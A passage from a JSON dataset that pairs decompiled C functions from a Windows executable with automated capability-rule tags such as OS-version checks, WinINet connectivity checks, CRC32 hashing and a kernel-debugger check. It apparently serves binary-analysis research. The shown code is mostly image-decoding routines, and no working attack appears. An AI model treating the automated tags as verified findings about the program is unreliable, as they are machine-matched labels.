0x34)) {\n                *(iVar1 + 0x34) = 0;\n            }\n            *(iVar1 + 0x3c) = *(in_EAX + 0xe8) + *(iVar1 + 0x34);\n        }\n    } while( true );\n}\n",
        "token_count": 826
    },
    "004862d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004862d4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (param_2 != 0) {\n        *(*in_EAX + 0x14) = 4;\n        (***in_EAX)(param_1);\n    }\n    puVar1 = (**in_EAX[1])();\n    in_EAX[0x54] = puVar1;\n    *puVar1 = 0x485e40;\n    if (*(in_EAX[0x58] + 8) == 0) {\n        puVar1[1] = fcn.00485eb4;\n        puVar1 = puVar1 + 2;\n        for (iVar3 = 0; iVar3 < in_EAX[0xe]; iVar3 = iVar3 + 1) {\n            uVar2 = (**(in_EAX[1] + 8))(in_EAX[0x3a]);\n            *puVar1 = uVar2;\n            puVar1 = puVar1 + 1;\n        }\n    }\n    else {\n        puVar1[1] = fcn.00486014;\n        fcn.004861bc();\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "00486fbc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.00486fbc(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    \n    puVar2 = (**in_EAX[1])();\n    in_EAX[0x57] = puVar2;\n    *puVar2 = 0x486fb8;\n    iVar1 = in_EAX[10];\n    uVar3 = iVar1 - 1;\n    if (uVar3 == 0) {\n        if (in_EAX[9] != 1) {\n            *(*in_EAX + 0x14) = 9;\n            uVar3 = (***in_EAX)();\n        }\n    }\n    else {\n        uVar3 = iVar1 - 4;\n        if (iVar1 - 2U < 2) {\n            if (in_EAX[9] != 3) {\n                *(*in_EAX + 0x14) = 9;\n                uVar3 = (***in_EAX)();\n            }\n        }\n        else {\n            bVar4 = uVar3 < 2;\n            uVar3 = iVar1 - 6;\n            if (bVar4) {\n                if (in_EAX[9] != 4) {\n                    *(*in_EAX + 0x14) = 9;\n                    uVar3 = (***in_EAX)();\n                }\n            }\n            else if (in_EAX[9] < 1) {\n                *(*in_EAX + 0x14) = 9;\n                uVar3 = (***in_EAX)();\n            }\n        }\n    }\n    // switch table (6 cases) at 0x48705f\n    switch(in_EAX[0xf]) {\n    default:\n        if ((in_EAX[0xf] != in_EAX[10]) || (uVar3 = in_EAX[0xe],  uVar3 != in_EAX[9])) {\n            *(*in_EAX + 0x14) = 0x1b;\n            uVar3 = (***in_EAX)();\n        }\n        puVar2[1] = fcn.00486f44;\n        return uVar3;\n    case 1:\n        break;\n    case 2:\n        if (in_EAX[0xe] != 3) {\n            *(*in_EAX + 0x14) = 10;\n            uVar3 = (***in_EAX)();\n        }\n        if (in_EAX[10] == 2) {\n            puVar2[1] = fcn.00486f44;\n            return uVar3;\n        }\n        *(*in_EAX + 0x14) = 0x1b;\n        uVar3 = (***in_EAX)();\n        return uVar3;\n    case 3:\n        if (in_EAX[0xe] != 3) {\n            *(*in_EAX + 0x14) = 10;\n            uVar3 = (***in_EAX)();\n        }\n        if (in_EAX[10] == 2) {\n            *puVar2 = 0x486b80;\n            puVar2[1] = fcn.00486c20;\n            return uVar3;\n        }\n        if (in_EAX[10] == 3) {\n            puVar2[1] = fcn.00486f44;\n            return uVar3;\n        }\n        *(*in_EAX + 0x14) = 0x1b;\n        uVar3 = (***in_EAX)();\n        return uVar3;\n    case 4:\n        if (in_EAX[0xe] != 4) {\n            *(*in_EAX + 0x14) = 10;\n            uVar3 = (***in_EAX)();\n        }\n        if (in_EAX[10] == 4) {\n            puVar2[1] = fcn.00486f44;\n            return uVar3;\n        }\n        *(*in_EAX + 0x14) = 0x1b;\n        uVar3 = (***in_EAX)();\n        return uVar3;\n    case 5:\n        if (in_EAX[0xe] != 4) {\n            *(*in_EAX + 0x14) = 10;\n            uVar3 = (***in_EAX)();\n        }\n        if (in_EAX[10] == 4) {\n            *puVar2 = 0x486b80;\n            puVar2[1] = fcn.00486db4;\n            return uVar3;\n        }\n        if (in_EAX[10] == 5) {\n            puVar2[1] = fcn.00486f44;\n            return uVar3;\n        }\n        *(*in_EAX + 0x14) = 0x1b;\n        uVar3 = (***in_EAX)();\n        return uVar3;\n    }\n    if (in_EAX[0xe] != 1) {\n        *(*in_EAX + 0x14) = 10;\n        uVar3 = (***in_EAX)();\n    }\n    if (in_EAX[10] == 1) {\n        puVar2[1] = fcn.00486ef8;\n        return uVar3;\n    }\n    if (in_EAX[10] == 2) {\n        *puVar2 = 0x486b80;\n        puVar2[1] = fcn.00486d28;\n        return uVar3;\n    }\n    if (in_EAX[10] == 3) {\n        puVar2[1] = fcn.00486ef8;\n        return uVar3;\n    }\n    *(*in_EAX + 0x14) = 0x1b;\n    uVar3 = (***in_EAX)();\n    return uVar3;\n}\n",
        "token_count": 1291
    },
    "0048720c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048720c(int32_t arg_8h)\n\n{\n    uchar uVar1;\n    int32_t *in_EAX;\n    uchar *puVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int32_t in_EDX;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((0 < arg_8h - in_ECX) && (iVar3 = 0,  0 < in_EDX)) {\n        do {\n            puVar2 = *in_EAX + in_ECX;\n            uVar1 = puVar2[-1];\n            for (iVar4 = arg_8h - in_ECX; 0 < iVar4; iVar4 = iVar4 + -1) {\n                *puVar2 = uVar1;\n                puVar2 = puVar2 + 1;\n            }\n            iVar3 = iVar3 + 1;\n            in_EAX = in_EAX + 1;\n        } while (iVar3 < in_EDX);\n    }\n    return;\n}\n",
        "token_count": 245
    },
    "00487588": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00487588(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    int32_t in_EAX;\n    int32_t iVar11;\n    uint8_t **in_ECX;\n    int32_t iVar12;\n    int32_t in_EDX;\n    int32_t iVar13;\n    uint8_t **var_2ch;\n    int32_t *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EDX + 0x1c);\n    fcn.0048720c(iVar1 << 4);\n    iVar11 = *(in_EAX + 0xbc) * 0x10;\n    iVar12 = *(in_EAX + 0xbc) * -0x50 + 0x4000;\n    var_28h = arg_8h;\n    var_2ch = in_ECX;\n    for (var_8h = 0; var_8h < *(in_EDX + 0xc); var_8h = var_8h + 1) {\n        puVar2 = *var_28h;\n        puVar3 = *var_2ch;\n        puVar4 = var_2ch[2];\n        puVar5 = var_2ch[1];\n        puVar6 = var_2ch[-1];\n        *puVar2 = (*puVar3 + puVar3[1] + *puVar5 + puVar5[1]) * iVar12 +\n                  ((*puVar6 + puVar6[1] + *puVar4 + puVar4[1] + *puVar3 + puVar3[2] + *puVar5 + puVar5[2]) * 2 +\n                  *puVar6 + puVar6[2] + *puVar4 + puVar4[2]) * iVar11 + 0x8000 >> 0x10;\n        iVar13 = iVar1 * 8 + -2;\n        while( true ) {\n            puVar2 = puVar2 + 1;\n            puVar10 = puVar4 + 2;\n            puVar9 = puVar6 + 2;\n            puVar8 = puVar5 + 2;\n            puVar7 = puVar3 + 2;\n            if (iVar13 == 0) break;\n            *puVar2 = (*puVar7 + puVar3[3] + *puVar8 + puVar5[3]) * iVar12 +\n                      ((*puVar9 + puVar6[3] + *puVar10 + puVar4[3] + puVar3[1] + puVar3[4] + puVar5[1] + puVar5[4]) * 2\n                      + puVar6[1] + puVar6[4] + puVar4[1] + puVar4[4]) * iVar11 + 0x8000 >> 0x10;\n            iVar13 = iVar13 + -1;\n            puVar3 = puVar7;\n            puVar5 = puVar8;\n            puVar6 = puVar9;\n            puVar4 = puVar10;\n        }\n        *puVar2 = (*puVar7 + puVar3[3] + *puVar8 + puVar5[3]) * iVar12 +\n                  ((*puVar9 + puVar6[3] + *puVar10 + puVar4[3] + puVar3[1] + puVar3[3] + puVar5[1] + puVar5[3]) * 2 +\n                  puVar6[1] + puVar6[3] + puVar4[1] + puVar4[3]) * iVar11 + 0x8000 >> 0x10;\n        var_2ch = var_2ch + 2;\n        var_28h = var_28h + 1;\n    }\n    return;\n}\n",
        "token_count": 989
    },
    "00487818": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00487818(int32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint8_t **in_ECX;\n    int32_t iVar8;\n    uint8_t *puVar9;\n    int32_t in_EDX;\n    int32_t arg_8h_00;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint8_t **var_34h;\n    int32_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *(in_EDX + 0x1c) * 8;\n    fcn.0048720c(arg_8h_00);\n    iVar8 = *(in_EAX + 0xbc) * -0x200 + 0x10000;\n    iVar5 = *(in_EAX + 0xbc) * 0x40;\n    var_30h = arg_8h;\n    var_34h = in_ECX;\n    for (var_8h = 0; var_8h < *(in_EDX + 0xc); var_8h = var_8h + 1) {\n        puVar2 = *var_30h;\n        uVar6 = **var_34h;\n        puVar9 = *var_34h + 1;\n        puVar3 = var_34h[1] + 1;\n        puVar4 = var_34h[-1] + 1;\n        iVar10 = *var_34h[-1] + *var_34h[1] + uVar6;\n        iVar11 = *puVar4 + *puVar3 + *puVar9;\n        *puVar2 = uVar6 * iVar8 + ((iVar10 * 2 - uVar6) + iVar11) * iVar5 + 0x8000 >> 0x10;\n        for (iVar7 = arg_8h_00 + -2; puVar2 = puVar2 + 1,  iVar7 != 0; iVar7 = iVar7 + -1) {\n            uVar1 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar4 = puVar4 + 1;\n            puVar3 = puVar3 + 1;\n            iVar12 = *puVar4 + *puVar3 + *puVar9;\n            *puVar2 = uVar1 * iVar8 + ((iVar11 - uVar1) + iVar10 + iVar12) * iVar5 + 0x8000 >> 0x10;\n            iVar10 = iVar11;\n            iVar11 = iVar12;\n        }\n        *puVar2 = *puVar9 * iVar8 + ((iVar11 * 2 - *puVar9) + iVar10) * iVar5 + 0x8000 >> 0x10;\n        var_34h = var_34h + 1;\n        var_30h = var_30h + 1;\n    }\n    return;\n}\n",
        "token_count": 791
    },
    "004879a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.004879a8(void)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code **ppcVar5;\n    int32_t iStack20;\n    \n    iStack20 = 1;\n    puVar1 = (**in_EAX[1])();\n    in_EAX[0x58] = puVar1;\n    *puVar1 = 0x487208;\n    puVar1[1] = fcn.0048725c;\n    puVar1[2] = 0;\n    if (in_EAX[0x2e] != 0) {\n        *(*in_EAX + 0x14) = 0x19;\n        (***in_EAX)();\n    }\n    iVar4 = in_EAX[0x10];\n    ppcVar5 = puVar1 + 3;\n    puVar2 = puVar1;\n    for (iVar3 = 0; iVar3 < in_EAX[0xe]; iVar3 = iVar3 + 1) {\n        puVar2 = *(iVar4 + 8);\n        if ((puVar2 == in_EAX[0x39]) && (*(iVar4 + 0xc) == in_EAX[0x3a])) {\n            if (in_EAX[0x2f] == 0) {\n                *ppcVar5 = fcn.004873f0;\n            }\n            else {\n                *ppcVar5 = fcn.00487818;\n                puVar1[2] = 1;\n            }\n        }\n        else {\n            puVar2 = *(iVar4 + 8) * 2;\n            if ((puVar2 == in_EAX[0x39]) && (*(iVar4 + 0xc) == in_EAX[0x3a])) {\n                iStack20 = 0;\n                *ppcVar5 = fcn.0048743c;\n            }\n            else {\n                puVar2 = *(iVar4 + 8) * 2;\n                if ((puVar2 == in_EAX[0x39]) && (*(iVar4 + 0xc) * 2 == in_EAX[0x3a])) {\n                    if (in_EAX[0x2f] == 0) {\n                        *ppcVar5 = fcn.004874d0;\n                    }\n                    else {\n                        *ppcVar5 = fcn.00487588;\n                        puVar1[2] = 1;\n                    }\n                }\n                else if ((in_EAX[0x39] % *(iVar4 + 8) == 0) &&\n                        (puVar2 = in_EAX[0x3a] / *(iVar4 + 0xc),  in_EAX[0x3a] % *(iVar4 + 0xc) == 0)) {\n                    iStack20 = 0;\n                    *ppcVar5 = fcn.004872e0;\n                }\n                else {\n                    *(*in_EAX + 0x14) = 0x26;\n                    puVar2 = (***in_EAX)();\n                }\n            }\n        }\n        ppcVar5 = ppcVar5 + 1;\n        iVar4 = iVar4 + 0x54;\n    }\n    if ((in_EAX[0x2f] != 0) && (iStack20 == 0)) {\n        *(*in_EAX + 0x14) = 99;\n        puVar2 = (**(*in_EAX + 4))();\n    }\n    return CONCAT44(iStack20, puVar2);\n}\n",
        "token_count": 795
    },
    "00489244": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00489244(int32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    uint var_530h;\n    uint var_12ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint8_t *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = in_EDX;\n    var_4h = in_EAX;\n    if ((in_ECX < 0) || (3 < in_ECX)) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x32;\n        *(iVar2 + 0x18) = in_ECX;\n        (***in_EAX)();\n    }\n    if (var_8h == 0) {\n        var_ch = var_4h[in_ECX + 0x19];\n    }\n    else {\n        var_ch = var_4h[in_ECX + 0x15];\n    }\n    if (var_ch == 0) {\n        iVar2 = *var_4h;\n        *(iVar2 + 0x14) = 0x32;\n        *(iVar2 + 0x18) = in_ECX;\n        (***var_4h)();\n    }\n    if (*arg_8h == 0) {\n        iVar2 = (**var_4h[1])();\n        *arg_8h = iVar2;\n    }\n    var_10h = *arg_8h;\n    var_14h = 0;\n    iVar2 = 1;\n    var_20h = var_ch + 1;\n    do {\n        uVar1 = *var_20h;\n        if (0x100 < uVar1 + var_14h) {\n            *(*var_4h + 0x14) = 8;\n            (***var_4h)();\n        }\n        puVar3 = &var_12ch + var_14h;\n        uVar7 = uVar1;\n        while (uVar7 != 0) {\n            var_14h = var_14h + 1;\n            *puVar3 = iVar2;\n            puVar3 = puVar3 + 1;\n            uVar7 = uVar7 - 1;\n        }\n        iVar2 = iVar2 + 1;\n        var_20h = var_20h + 1;\n    } while (iVar2 < 0x11);\n    *(&var_12ch + var_14h) = 0;\n    iVar2 = 0;\n    var_18h = var_12ch;\n    iVar6 = 0;\n    while (*(&var_12ch + iVar6) != '\\0') {\n        piVar5 = &var_530h + iVar6;\n        for (pcVar4 = &var_12ch + iVar6; *pcVar4 == var_18h; pcVar4 = pcVar4 + 1) {\n            *piVar5 = iVar2;\n            iVar6 = iVar6 + 1;\n            piVar5 = piVar5 + 1;\n            iVar2 = iVar2 + 1;\n        }\n        if (1 << (var_18h & 0x1f) <= iVar2) {\n            *(*var_4h + 0x14) = 8;\n            (***var_4h)();\n        }\n        iVar2 = iVar2 * 2;\n        var_18h = var_18h + 1;\n    }\n    fcn.00476ba0(var_10h + 0x400, 0, 0x100);\n    if (var_8h == 0) {\n        var_1ch = 0xff;\n    }\n    else {\n        var_1ch = 0xf;\n    }\n    var_28h = &var_12ch;\n    var_24h = &var_530h;\n    iVar2 = 0;\n    puVar8 = var_ch + 0x11;\n    if (0 < var_14h) {\n        do {\n            uVar7 = *puVar8;\n            if ((var_1ch < uVar7) || (*(var_10h + 0x400 + uVar7) != '\\0')) {\n                *(*var_4h + 0x14) = 8;\n                (***var_4h)();\n            }\n            iVar2 = iVar2 + 1;\n            puVar8 = puVar8 + 1;\n            *(var_10h + uVar7 * 4) = *var_24h;\n            *(var_10h + 0x400 + uVar7) = *var_28h;\n            var_28h = var_28h + 1;\n            var_24h = var_24h + 1;\n        } while (iVar2 < var_14h);\n    }\n    return;\n}\n",
        "token_count": 1199
    },
    "0048af80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048af80(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x48b1ca;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    piVar2 = fcn.00423eac();\n    iVar3 = (**(*piVar2 + 0x2c))();\n    piVar2 = fcn.00423eac();\n    var_20h = (**(*piVar2 + 0x20))();\n    piVar2 = fcn.00426010();\n    fcn.00423eac();\n    (**(*piVar2 + 8))();\n    (**(*piVar2 + 0x40))();\n    (**(*piVar2 + 0x34))();\n    if (-1 < var_20h + -1) {\n        do {\n            iVar4 = fcn.00426754();\n            fcn.00423eac();\n            iVar5 = fcn.00426754();\n            if (-1 < iVar3 + -1) {\n                iVar6 = 0;\n                var_24h = iVar3;\n                do {\n                    iVar7 = *(iVar5 + 2 + iVar6 * 3) + *(*(in_EAX + 0x428) + 0x254);\n                    var_ch = *(iVar5 + 1 + iVar6 * 3) + *(*(in_EAX + 0x42c) + 0x254);\n                    var_10h = *(iVar5 + iVar6 * 3) + *(*(in_EAX + 0x430) + 0x254);\n                    if (iVar7 < 0x100) {\n                        if (iVar7 < 0) {\n                            iVar7 = 0;\n                        }\n                    }\n                    else {\n                        iVar7 = 0xff;\n                    }\n                    if (var_ch < 0x100) {\n                        if (var_ch < 0) {\n                            var_ch = 0;\n                        }\n                    }\n                    else {\n                        var_ch = 0xff;\n                    }\n                    if (var_10h < 0x100) {\n                        if (var_10h < 0) {\n                            var_10h = 0;\n                        }\n                    }\n                    else {\n                        var_10h = 0xff;\n                    }\n                    cVar1 = (**(**(in_EAX + 0x410) + 0xd8))();\n                    if (cVar1 != '\\0') {\n                        *(iVar4 + 2 + iVar6 * 3) = iVar7;\n                    }\n                    cVar1 = (**(**(in_EAX + 0x414) + 0xd8))();\n                    if (cVar1 != '\\0') {\n                        *(iVar4 + 1 + iVar6 * 3) = var_ch;\n                    }\n                    cVar1 = (**(**(in_EAX + 0x418) + 0xd8))();\n                    if (cVar1 != '\\0') {\n                        *(iVar4 + iVar6 * 3) = var_10h;\n                    }\n                    iVar6 = iVar6 + 1;\n                    var_24h = var_24h + -1;\n                } while (var_24h != 0);\n            }\n            var_20h = var_20h + -1;\n        } while (var_20h != 0);\n    }\n    piVar2 = fcn.00423eac();\n    (**(*piVar2 + 8))();\n    piVar2 = fcn.00423eac();\n    (**(*piVar2 + 8))();\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x48b1d1;\n    uStack60 = 0x48b1c9;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 1001
    },
    "0048b740": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048b740(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *in_FS_OFFSET;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    uStack96 = 0x48ba05;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    piVar2 = fcn.00426010();\n    fcn.00423eac();\n    (**(*piVar2 + 8))();\n    piVar2 = fcn.00426010();\n    fcn.00423eac();\n    (**(*piVar2 + 8))();\n    piVar2 = fcn.00423eac();\n    var_38h = (**(*piVar2 + 0x20))();\n    piVar2 = fcn.00423eac();\n    iVar3 = (**(*piVar2 + 0x2c))();\n    if (-1 < var_38h + -1) {\n        do {\n            iVar4 = fcn.00426754();\n            fcn.00426754();\n            if (-1 < iVar3 + -1) {\n                var_28h = 0;\n                var_3ch = iVar3;\n                do {\n                    if (arg_10h != '\\0') {\n                        fcn.00403160();\n                    }\n                    fcn.00403154();\n                    fcn.00403154();\n                    fcn.00403154();\n                    iVar5 = fcn.00403154();\n                    iVar6 = fcn.00403154();\n                    iVar7 = fcn.00403154();\n                    if (iVar5 < 0x100) {\n                        if (iVar5 < 0) {\n                            iVar5 = 0;\n                        }\n                    }\n                    else {\n                        iVar5 = 0xff;\n                    }\n                    if (iVar6 < 0x100) {\n                        if (iVar6 < 0) {\n                            iVar6 = 0;\n                        }\n                    }\n                    else {\n                        iVar6 = 0xff;\n                    }\n                    if (iVar7 < 0x100) {\n                        if (iVar7 < 0) {\n                            iVar7 = 0;\n                        }\n                    }\n                    else {\n                        iVar7 = 0xff;\n                    }\n                    iVar1 = var_28h * 3;\n                    *(iVar4 + 2 + iVar1) = iVar5;\n                    *(iVar4 + 1 + iVar1) = iVar6;\n                    *(iVar4 + iVar1) = iVar7;\n                    var_28h = var_28h + 1;\n                    var_3ch = var_3ch + -1;\n                } while (var_3ch != 0);\n            }\n            var_38h = var_38h + -1;\n        } while (var_38h != 0);\n    }\n    piVar2 = fcn.00423eac();\n    (**(*piVar2 + 8))();\n    *in_FS_OFFSET = uStack100;\n    puStack92 = 0x48ba0c;\n    uStack96 = 0x48b9fc;\n    fcn.00403f58();\n    uStack96 = 0x48ba04;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 883
    },
    "0048c924": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.0048c924(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    bool bVar3;\n    int32_t var_4h;\n    \n    bVar3 = false;\n    uVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x48c990, 0x48c980);\n    pcVar2 = sub.kernel32.dll_GetProcAddress_1(uVar1);\n    if (pcVar2 != NULL) {\n        uVar1 = sub.kernel32.dll_GetCurrentProcess(&var_4h);\n        (*pcVar2)(uVar1);\n        bVar3 = var_4h != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 154
    },
    "0048f0ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0048f0ac(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x48f11e;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar1 = *0x495914 == 0;\n    *0x495914 = *0x495914 + -1;\n    if (bVar1) {\n        fcn.00404b24();\n        fcn.00404b4c();\n        if (*0x4957f1 != '\\0') {\n            fcn.00404df4();\n        }\n        fcn.0040cc60();\n        fcn.00406410();\n        fcn.0040cd64();\n        fcn.0040dc80();\n        fcn.0040d5dc();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 234
    },
    "004022cc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nchar __cdecl fcn.004022cc(int32_t lpBuffer)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    \n    if ((in_EAX - 0x4cU < *(lpBuffer + -0x1c)) || (*(lpBuffer + -0x1c) + *(lpBuffer + -0x10) < in_EAX - 0x21U)) {\n        sub.kernel32.dll_VirtualQuery(in_EAX + -0x4c, lpBuffer + -0x1c, 0x1c);\n    }\n    if (((((in_EDX < 1000) && (in_EAX - 0x21U < *(lpBuffer + -0x1c) + *(lpBuffer + -0x10))) &&\n         (*(lpBuffer + -0xc) == 0x1000)) && (((*(lpBuffer + -8) & 0xe6) != 0 && ((*(lpBuffer + -7) & 1) == 0)))) &&\n       (in_EAX == *(in_EAX + -0x4c))) {\n        cVar1 = '\\x01';\n    }\n    else {\n        cVar1 = '\\0';\n    }\n    if (cVar1 != '\\0') {\n        if ((*(in_EAX + -0x24) != 0) && (cVar1 = fcn.004022cc(lpBuffer),  cVar1 == '\\0')) {\n            return '\\0';\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 348
    },
    "004095a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint16_t * __fastcall fcn.004095a4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    uint16_t *in_EAX;\n    uint16_t *puVar3;\n    \n    param_2 = param_2 - in_EAX;\n    puVar3 = in_EAX;\n    if ((in_EAX & 1) != 0) {\n        cVar1 = *(param_2 + in_EAX);\n        *in_EAX = cVar1;\n        if (cVar1 == '\\0') {\n            return in_EAX;\n        }\n        puVar3 = in_EAX + 1;\n    }\n    do {\n        if (*(param_2 + puVar3) == '\\0') {\n            *puVar3 = '\\0';\n            return in_EAX;\n        }\n        uVar2 = *(param_2 + puVar3);\n        *puVar3 = uVar2;\n        puVar3 = puVar3 + 1;\n    } while (0xff < uVar2);\n    return in_EAX;\n}\n",
        "token_count": 244
    },
    "00415448": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
